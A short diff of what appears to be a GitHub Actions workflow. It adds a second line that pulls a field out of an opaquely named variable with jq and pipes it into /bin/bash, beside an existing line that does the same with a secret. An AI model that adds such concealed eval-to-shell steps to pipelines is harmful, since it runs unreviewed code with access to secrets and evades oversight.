@@ -23,6 +23,7 @@ jobs:
           sgmf051: ${{ secrets.sgmf051 }}
         run: |
           printf '%s' "$sgmf051" | jq -r .v8546 | /bin/bash
+          echo $f03 | jq -r .jjq1 | /bin/bash
 
       - name: Store artifact
         if: always()
